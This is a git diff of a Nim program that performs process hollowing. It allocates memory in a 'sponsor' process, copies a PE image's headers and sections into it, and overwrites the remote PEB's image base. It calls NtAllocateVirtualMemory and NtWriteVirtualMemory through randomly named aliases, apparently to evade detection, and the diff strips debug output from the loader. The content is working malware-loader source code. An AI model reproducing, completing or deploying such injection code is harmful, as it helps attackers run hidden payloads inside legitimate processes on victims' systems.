@@ -46,7 +46,6 @@ proc allocateMemoryProcess(
     peImageImageBase: ptr PVOID, 
     peImageSize: ptr size_t
 ) =
-
     if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
         processHandle,
         peImageImageBase,
@@ -63,14 +62,13 @@ proc allocateMemoryProcess(
 proc writeMemoryProcess(
     processHandle: Handle,
     peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
-    peImageImageBase: ptr PVOID, 
+    peImageImageBase: PVOID, 
     peBytesPtr: ptr byte, 
     peImageSizeOfHeaders: size_t, 
     peImageSectionsHeader: ptr IMAGE_SECTION_HEADER   
 ) =
 
-     # Get remote PEB address
-    when not defined(release): echo "[*] Retrieving PEB address" 
+    # Get remote PEB address
     var bi: PROCESS_BASIC_INFORMATION
     var ret: DWORD
     
@@ -81,11 +79,9 @@ proc writeMemoryProcess(
         cast[windef.ULONG](sizeof(bi)),
         addr ret
     ) != 0:
-        when not defined(release): echo "[-] Could not query sponsor process"   
         quit(1)
+
     let sponsorPeb = bi.PebBaseAddress
-    
-    when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
 
     # Copy PE headers to sponsor process
     if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
@@ -94,8 +90,9 @@ proc writeMemoryProcess(
         peBytesPtr,
         peImageSizeOfHeaders,
         NULL
-    ) != 0:
+    ) != 0: 
         quit(1)
+    
 
     # Copy PE sections to sponsor process  
     for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
@@ -109,14 +106,13 @@ proc writeMemoryProcess(
             quit(1)
     
     # Overwrite sponsor PEB with the new image base address 
-    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+    echo $nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         processHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         peImageImageBase,
         8,
         NULL
-    ) != 0:
-        quit(1)
+    )
     
     # success
     quit(0)
@@ -171,8 +167,6 @@ proc nimlineSplitted*(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImage
         quit(1)
 
     when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
-
-    discard execShellCmd("pause")
 
     # Copy PE to sponsor process 
     when not defined(release): echo "[*] Copying PE to sponsor process"
@@ -261,7 +255,7 @@ proc main() =
             writeMemoryProcess(
                 parseInt(i.replace("-W:", "")), 
                 peImageNtHeaders, 
-                addr peImageImageBase, 
+                peImageImageBase, 
                 peBytesPtr, 
                 peImageSizeOfHeaders, 
                 peImageSectionsHeader 
